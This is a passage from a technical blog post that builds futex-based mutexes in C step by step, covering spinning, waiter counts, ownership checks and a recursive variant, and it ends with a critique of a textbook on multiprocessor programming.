back-off, we could end up with many threads continuing to wake up all at the same time, just to contend with each other again.</p><p>With a futex, we can just wake up a single thread (which might have to contend with new threads coming in).</p><p>Let’s build it, even though we still won’t be dealing with recursion or accidental unlocks.</p><p>Given the risk of accidental unlock, we’ll call this our “unsafe” mutex.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#define H4X0R_SPIN_COUNT 16
</span></span></span><span><span><span></span>
</span></span><span><span><span>typedef</span> <span>h4x0r_futex_t</span> <span>h4x0r_mutex_unsafe_t</span>;
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe_init</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>atomic_store</span>(lock, <span>0</span>);        
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe_acquire</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>!</span><span>atomic_fetch_or</span>(lock, <span>1</span>)) {
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)lock, <span>1</span>, NULL);
</span></span><span><span>        <span>if</span> (<span>!</span><span>atomic_fetch_or</span>(lock, <span>1</span>)) {
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe_release</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>   <span>atomic_store</span>(lock, <span>0</span>);
</span></span><span><span>   <span>h4x0r_futex_wake</span>(lock, false);
</span></span><span><span>}
</span></span></code></pre></div><p>Here, we spin for a bit, and if things aren’t contested, then we wait on the futex. Whoever has the lock will notify up to one thread on wake. For our simple use case, it doesn’t really matter why we fail if we don’t wait on the futex, so we just loop.</p><table><tbody><tr><td>‼️</td><td>You are generally not guaranteed that threads will be awoken in any specific order. Still, generally, that's probably not worth worrying about.</td></tr></tbody></table><h2 id="minimizing-system-calls">Minimizing system calls</h2><p>The futex can help us avoid a bunch of unnecessary wake-ups, and thus a lot of system calls. However, in many cases, mutex access will be totally uncontested, and we’ll be making a system call to wake up… nobody.</p><p>There are ways to address this pretty simply, allowing us to avoid <em>most</em> spurious wakeups. We’re only using one bit of our futex, and it doesn’t actually matter which bit. So we’re going to move the bit up to the top, and use the rest as a wait-counter.</p><p>We’ll have threads add to it before they first try to go to sleep, and subtract when they wake up. When the thread holding the lock unlocks the mutex, we’ll use <code>atomic_fetch_and()</code> to remove the mutex’s <strong>lock</strong> flag, but leave all other bits intact, and we’ll then look to see if the wait-count is zero. If it is, we’ll skip the wake-up.</p><p>This can still lead to <em>some</em> extra system calls:</p><ol><li><p>The mutex could get released after the thread added its value to wait count, but before it actually puts itself to sleep.</p></li><li><p>Other threads may end up adding to the count and going to sleep once we’ve released, and after another thread grabbed the lock.</p></li></ol><p>The first case seems scary; it won’t risk a deadlock, because if the unlock happens before the wait, the waiting thread will have the wrong expected value, and the futex call will fail.</p><p>The second case leads to a spurious wake-up. The woken thread checks the futex again, sees it’s locked, and goes back to sleep, but that’s two extra system calls.</p><p>Still, this is going to avoid plenty of unnecessary wakes and system calls in practice.</p><p>Using this idea, let’s build our second mutex. This version is also unsafe, because we’re not yet dealing with ownership, so we’ll modify calls with <code>unsafe2</code>. But we’ll reuse the <code>h4x0r_mutex_unsafe_t</code> type, and calls that do not change from the previous implementation.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>// We'll re-use these constants in our last mutex.
</span></span></span><span><span><span></span><span>#define H4X0R_MUTEX_LOCK_ON (1 &lt;&lt; 31)
</span></span></span><span><span><span>#define H4X0R_MUTEX_LOCK_OFF ~(H4X0R_MUTEX_LOCK_ON)
</span></span></span><span><span><span></span>
</span></span><span><span><span>// This function will get reused too.
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_value_is_unlocked</span>(<span>uint32_t</span> value)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>!</span>(value <span>&amp;</span> H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_try_lock</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> value <span>=</span> <span>atomic_fetch_or</span>(lock, H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>    <span>return</span> <span>h4x0r_mutex_value_is_unlocked</span>(value);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>uint32_t</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_add_waiter</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>1</span> <span>+</span> <span>atomic_fetch_add</span>(lock, <span>1</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_acquire</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> expected;
</span></span><span><span>
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_unsafe2_try_lock</span>(lock)) {
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    expected <span>=</span> <span>h4x0r_mutex_unsafe2_add_waiter</span>(lock);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_value_is_unlocked</span>(expected)
</span></span><span><span>	    <span>&amp;&amp;</span> <span>h4x0r_mutex_unsafe2_try_lock</span>(lock)) {
</span></span><span><span>            <span>atomic_fetch_add</span>(lock, <span>-</span><span>1</span>);
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>
</span></span><span><span>        <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)lock, expected, NULL);
</span></span><span><span>        expected <span>=</span> <span>atomic_load</span>(lock);
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_release</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>   <span>uint32_t</span> waiters <span>=</span> <span>atomic_fetch_and</span>(lock, H4X0R_MUTEX_LOCK_OFF);
</span></span><span><span>
</span></span><span><span>   <span>if</span> (waiters <span>!=</span> H4X0R_MUTEX_LOCK_ON) {
</span></span><span><span>       <span>h4x0r_futex_wake</span>(lock, false);
</span></span><span><span>   }
</span></span><span><span>}
</span></span></code></pre></div><p>We broke out the lock test and the attempt to lock into separate inline functions for clarity.</p><p>Also, we did the same for the function that registers ourselves as a waiter, as it’s a little more complicated than just atomically bumping the wait count. Much like <code>atomic_fetch_or()</code>, the function <code>atomic_fetch_add()</code> will return the value there <strong>BEFORE</strong> our modification.</p><p>But, we’re going to have to tell the futex routine what value we think is there when we go to wait, so we <em>also</em> need to add to the wait count on the value that gets returned.</p><p>Notice that, when we do add to the wait count, it doesn’t matter how many times we wake from the futex; we only add ourselves one time, and remove ourselves only once we <em>acquire</em> the lock. We definitely don’t want ourselves to be counted when we test to see if we should make the system call to wake a waiter.</p><p>Here too, <code>atomic_fetch_and()</code> will return a value before our operation is applied. So in this mutex, if there are no waiters at the point of our atomic operation, the value we get back will actually be <code>H4X0R_MUTEX1_LOCK_ON</code>, even though we will have just set the mutex’s value to <code>0</code>.</p><p>Here, we don’t redo the operation; we just make the proper comparison.</p><h2 id="asserting-ownership">Asserting Ownership</h2><p>Dealing with ownership isn’t too big a deal; we just need to keep track of who owns the lock, if anyone, and check it when it’s safe to do so.</p><p>We’ll use <code>pthread_t</code> for identity, which we can directly store and compare, even though it has a slight issue– the underlying implementation of the data structure is implementation-dependent.</p><p>This means we can’t 100% reliably keep track of the thread with just the <code>pthread_t</code> value, because we don’t know a portable value that says “not a thread.” The easiest thing for us to do is just take up some more space, and keep a flag to keep track of whether it’s owned or not, for when we are checking ownership.</p><p>Once we check ownership, our mutex is safe, so this will be our default mutex type (we’ll modify this code to make a recursive mutex later).</p><p>Here, then, is our new mutex definition and initializer:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>typedef</span> <span>struct</span> {
</span></span><span><span>    <span>h4x0r_futex_t</span>      futex;
</span></span><span><span>    <span>_Atomic</span>(<span>pthread_t</span>) owner;
</span></span><span><span>    <span>_Atomic</span>(<span>bool</span>)      owned;
</span></span><span><span>} <span>h4x0r_mutex_t</span>;
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_init</span>(<span>h4x0r_mutex_t</span> <span>*</span>mutex)
</span></span><span><span>{
</span></span><span><span>    <span>*</span>mutex <span>=</span> (<span>h4x0r_mutex_t</span>) {
</span></span><span><span>	.futex <span>=</span> <span>0</span>,
</span></span><span><span>	.owned <span>=</span> false,
</span></span><span><span>    };
</span></span><span><span>}
</span></span></code></pre></div><p>We’ve declared all of the fields atomic. Yes, we’re only going to change them when we own the mutex, but we can’t always count on sequential consistency on the fields if they aren’t atomic, even if they’re in the same struct as threads that are. There are platforms (like ARM) where you’re particularly at risk of issues if you’re not really careful. When in doubt, go for full sequential consistency.</p><p>The atomics do force sequential consistency when we update those fields. Without it, we might end up with, for instance, thread A yielding the futex, but their ownership flag still being set when thread B quickly grabs the lock.</p><p>In the rest of this implementation, we’re going to take the same basic approach we did with the previous mutex, with the significant changes (besides moving from a uint32_t only to a data structure) being:</p><ol><li>When we unlock a mutex, we’ll double-check that we own it first. If we do <strong>NOT</strong>, that’s a fatal error, and we’ll print a message and abort.</li><li>We’ll check for ownership <em>before</em> we acquire a lock.</li><li>With this check, if there’s an owner, and we’re <em>not</em> it, that’s also a fatal error.</li></ol><p>We’ll also add a timeout field to our lock, which we’ll pass down to the futex if we block (the time we spend spinning will be irrelevant).</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_try_lock</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>
</span></span><span><span>    <span>uint32_t</span> value <span>=</span> <span>atomic_fetch_or</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>    <span>pthread_t</span> self;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>h4x0r_mutex_value_is_unlocked</span>(value)) {
</span></span><span><span>	<span>return</span> false;
</span></span><span><span>    }
</span></span><span><span>    <span>// If what we read when we wrote says "unlocked", then we
</span></span></span><span><span><span></span>    <span>// successfully acquired the lock.
</span></span></span><span><span><span></span>    self <span>=</span> <span>pthread_self</span>();
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)) {
</span></span><span><span>	<span>if</span> (<span>pthread_equal</span>(self, <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	    <span>fprintf</span>(stderr, <span>"Mutex was used recursively.</span><span>\n</span><span>"</span>);
</span></span><span><span>	}
</span></span><span><span>	<span>else</span> {
</span></span><span><span>	    <span>fprintf</span>(stderr, <span>"Acquired a lock owner didn't properly yield.</span><span>\n</span><span>"</span>);
</span></span><span><span>	}
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>	
</span></span><span><span>    <span>// We have the lock, so we make it known.
</span></span></span><span><span><span></span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, true);
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owner, self);
</span></span><span><span>    
</span></span><span><span>    <span>return</span> true;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>uint32_t</span>
</span></span><span><span><span>h4x0r_mutex_add_waiter</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>1</span> <span>+</span> <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>1</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_acquire</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock, <span>struct</span> timespec <span>*</span>timeout)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span>  expected;
</span></span><span><span>
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_try_lock</span>(lock)) {
</span></span><span><span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    expected <span>=</span> <span>h4x0r_mutex_add_waiter</span>(lock);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_value_is_unlocked</span>(expected) <span>&amp;&amp;</span>
</span></span><span><span>	    <span>h4x0r_mutex_try_lock</span>(lock)) {
</span></span><span><span>            <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>-</span><span>1</span>);
</span></span><span><span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>
</span></span><span><span>        <span>int</span> err <span>=</span> <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)<span>&amp;</span>lock<span>-&gt;</span>futex,
</span></span><span><span>					    expected,
</span></span><span><span>					    timeout);
</span></span><span><span>
</span></span><span><span>	<span>if</span> (err <span>==</span> ETIMEDOUT) {
</span></span><span><span>	    <span>return</span> false;
</span></span><span><span>	}
</span></span><span><span>        expected <span>=</span> <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>futex);
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_release</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>!</span><span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)
</span></span><span><span>        <span>||</span> <span>!</span><span>pthread_equal</span>(<span>pthread_self</span>(), <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	<span>fprintf</span>(stderr, <span>"Thread unlocked a mutex it doesn't own.</span><span>\n</span><span>"</span>);
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>        
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, false);
</span></span><span><span>    
</span></span><span><span>    <span>uint32_t</span> waiters <span>=</span> <span>atomic_fetch_and</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_OFF);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (waiters <span>!=</span> H4X0R_MUTEX_LOCK_ON) {
</span></span><span><span>	<span>h4x0r_futex_wake</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, false);
</span></span><span><span>    }
</span></span><span><span>}
</span></span></code></pre></div><p>We implemented our locking capability on top of <code>h4x0r_mutex_try_lock()</code>, which makes a single attempt to claim a lock. If it succeeds, it then performs its validity checks, and if THOSE succeed, it sets the ownership info.</p><p>When we’re releasing the lock, we test the boolean to see if there’s an owner. If that’s set, we then ensure that we’re the right owner.</p><p>The <code>try_lock</code> is a common API feature for mutexes, as an alternative to a timeout.</p><h2 id="does-it-feel-like-were-repeating-ourselves">Does it feel like we’re repeating ourselves?</h2><p>There’s a very good question the book didn’t seem to opine on: whether you should ever be using recursive mutexes at all. For mutexes, I tend to lean towards <strong>no</strong>, as it encourages sloppy programming.</p><p>But, I will admit to being on the fence, and you’re mature enough to make up your own minds. So let’s look at what we’d have to do.</p><p>To make our previous lock recursive, we’ll keep a field that keeps track of the levels of nesting. To avoid deadlocking with ourselves, our lock functions will need to check to ensure they don’t own the lock before their first lock attempt.</p><p>For that reason, the core <code>try_lock</code> operation is moved to a call marked <code>internal</code>, specifically <code>h4x0r_mutex_recursive_internal_try_lock()</code>. The call <code>h4x0r_mutex_recursive_try_lock()</code> only needs to perform the ownership check, then can make the internal call.</p><p>Here’s what initialization looks like now:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>typedef</span> <span>struct</span> {
</span></span><span><span>    <span>h4x0r_futex_t</span>      futex;
</span></span><span><span>    <span>_Atomic</span>(<span>uint32_t</span>)  depth;
</span></span><span><span>    <span>_Atomic</span>(<span>pthread_t</span>) owner;
</span></span><span><span>    <span>_Atomic</span>(<span>bool</span>)      owned;
</span></span><span><span>} <span>h4x0r_mutex_recursive_t</span>;
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_recursive_init</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>mutex)
</span></span><span><span>{
</span></span><span><span>    <span>*</span>mutex <span>=</span> (<span>h4x0r_mutex_recursive_t</span>) {
</span></span><span><span>	.futex <span>=</span> <span>0</span>,
</span></span><span><span>	.depth <span>=</span> <span>0</span>,
</span></span><span><span>	.owned <span>=</span> false,
</span></span><span><span>    };
</span></span><span><span>}
</span></span></code></pre></div><p>That’s no big deal. Since two different lock calls now need to check ownership, we’ll break that out into its own helper.</p><p>We’re going to need to check ownership before we try to lock the first time. We’ll have our function return <code>true</code> if the calling thread already owns the lock, and false if not.</p><p>So it will return false:</p><ol><li>If the mutex is not owned.</li><li>If it’s locked, but the current thread doesn’t own it.</li></ol><p>If it’s not one of these two cases, then it’s a recursive call by the owner. This call will bump up the depth counter before returning <code>true</code>; the caller can immediately bail.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_check_ownership</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock,
</span></span><span><span>				      <span>pthread_t</span>                self)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>!</span><span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)) {
</span></span><span><span>	<span>return</span> false;
</span></span><span><span>    }
</span></span><span><span>    <span>if</span> (<span>pthread_equal</span>(self, <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	<span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>depth, <span>1</span>);
</span></span><span><span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> false;
</span></span><span><span>}
</span></span></code></pre></div><p>If we didn’t own the lock, once we acquire the lock, we need to assert our ownership. At this point, we can double-check that the lock is not marked as owned. If it were, that’d indicate a bug in our implementation, so it could make some sense to skip that check.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>// Called from our internal try-lock call, once it knows we definitely
</span></span></span><span><span><span>// just acquired ownership.
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_recursive_new_ownership</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock,
</span></span><span><span>				    <span>pthread_t</span>                self)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)) {
</span></span><span><span>	<span>fprintf</span>(stderr, <span>"Acquired a lock owner didn't properly yield.</span><span>\n</span><span>"</span>);
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, true);
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owner, self);
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>depth, <span>1</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>When the user unlocks a mutex, we will also need to check ownership. We’ll also need to distinguish between the case where we’re done nesting, and should actually unlock, and when we shouldn’t:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>// Called when definitely holding the lock.
</span></span></span><span><span><span>// Returns true if we are nested, and false if we aren't (proper unlock).
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_nesting_check</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>pthread_equal</span>(<span>pthread_self</span>(), <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	<span>fprintf</span>(stderr, <span>"Thread is trying to unlock a lock it doesn't own.</span><span>\n</span><span>"</span>);
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>depth, <span>-</span><span>1</span>) <span>&gt;</span> <span>1</span>) {
</span></span><span><span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>	<span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, false);
</span></span><span><span>	<span>return</span> false;
</span></span><span><span>}
</span></span></code></pre></div><p>The rest of the recursive lock implementation is then straightforward, given our previous locks:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_internal_try_lock</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock, <span>pthread_t</span> self)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> value <span>=</span> <span>atomic_fetch_or</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>    <span>bool</span> result    <span>=</span>  <span>h4x0r_mutex_value_is_unlocked</span>(value);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (result) {
</span></span><span><span>	<span>h4x0r_mutex_recursive_new_ownership</span>(lock, self);
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> result;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>uint32_t</span>
</span></span><span><span><span>h4x0r_mutex_recursive_add_waiter</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>1</span> <span>+</span> <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>1</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_acquire</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock,
</span></span><span><span>			      <span>struct</span> timespec         <span>*</span>timeout)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span>  expected;
</span></span><span><span>    <span>pthread_t</span> self <span>=</span> <span>pthread_self</span>();
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>h4x0r_mutex_recursive_check_ownership</span>(lock, self)) {
</span></span><span><span>	<span>// We already owned the lock, and incremented the nesting count.
</span></span></span><span><span><span></span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_recursive_internal_try_lock</span>(lock, self)) {
</span></span><span><span>	    <span>// internal_try_lock will set up ownership.
</span></span></span><span><span><span></span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    expected <span>=</span> <span>h4x0r_mutex_recursive_add_waiter</span>(lock);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_value_is_unlocked</span>(expected)
</span></span><span><span>            <span>&amp;&amp;</span> <span>h4x0r_mutex_recursive_internal_try_lock</span>(lock, self)) {
</span></span><span><span>            <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>-</span><span>1</span>);
</span></span><span><span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>
</span></span><span><span>        <span>int</span> err <span>=</span> <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)<span>&amp;</span>lock<span>-&gt;</span>futex,
</span></span><span><span>					    expected,
</span></span><span><span>					    timeout);
</span></span><span><span>	<span>if</span> (err <span>==</span> ETIMEDOUT) {
</span></span><span><span>	    <span>return</span> false;
</span></span><span><span>	}
</span></span><span><span>        expected <span>=</span> <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>futex);
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_try_lock</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>pthread_t</span> self <span>=</span> <span>pthread_self</span>();
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>h4x0r_mutex_recursive_check_ownership</span>(lock, self)) {
</span></span><span><span>	<span>// We already owned the lock, and incremented the nesting count.
</span></span></span><span><span><span></span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>    <span>return</span> <span>h4x0r_mutex_recursive_internal_try_lock</span>(lock, self);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_recursive_release</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>h4x0r_mutex_recursive_nesting_check</span>(lock)) {
</span></span><span><span>	<span>// We were nested, and the decrement happened, so we're done.
</span></span></span><span><span><span></span>	<span>return</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>uint32_t</span> waiters <span>=</span> <span>atomic_fetch_and</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_OFF);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (waiters <span>!=</span> H4X0R_MUTEX_LOCK_ON) {
</span></span><span><span>	<span>h4x0r_futex_wake</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, false);
</span></span><span><span>    }
</span></span><span><span>}
</span></span></code></pre></div><h2 id="remaining-issues">Remaining issues</h2><p>The core issue we have left is, what happens when a thread exits or dies when a mutex is locked??</p><p>It’s a bit much for us to cover today, but here’s a sketch of what we’d need to do:</p><ol><li>Each thread will need a private list of locks it is actively holding, which we would modify in the calls above.</li><li>In most thread APIs, we can register a callback when a thread exits (or is canceled). We’d need to register a handler for this, probably once per thread, when it’s launched.</li><li>That callback will need to go through the list and break any locks still held.</li><li>Many people won’t worry about crashed threads, as they often will crash the whole program. However, you can catch the signal a crash generates and keep the overall process from terminating. On Linux, you can compare your view of what threads are live with the OS’s view in <code>proc</code>. On other platforms, you might not be able to get the exact thread that crashed. However, if you’re managing threads that launch, you will probably have a way to give yourself visibility into what threads do not check in over a very short time.</li></ol><p>Another related issue comes up once you allow mutexes to span processes via memory shared across processes. The same basic code all works fine, modulo some changes to how to use a futex. Our problem is, what happens when a process holding a lock forks??</p><p>That’s also an issue you can handle if you’re managing all the locks. But if it’s a problem mentioned in the book– I can’t find it, after skimming over <em>31 uses</em> of the word <code>fork</code> (outside the context of cutlery🍴, which gets one use). Those uses are spread across a mere <em>9 pages</em>. Almost all of those uses are talking specifically about algorithms leveraging Java’s <code>ForkJoin</code> class, which is a thread pooling scheme within a process, not a proper posix <code>fork()</code>.</p><h2 id="reading--writing-_the-art--engineering-of-multiprocessor-programming_">Reading / Writing <em>The Art / Engineering of Multiprocessor Programming</em></h2><p>The book being named with the word “Art” is apt, because it’s not really engineering best practices.</p><p>To be fair, the book does mention that some locking primitives are lock-aware and some aren’t. It also shows how to build a recursive lock using a non-recursive lock (in Java, of course).</p><p>But it does so using a condition variable, which is horrible. If you just care about engineering best practices, you should have easy access to a reentrant mutex already (pthreads provides one). I’d expect that to be more performant than a 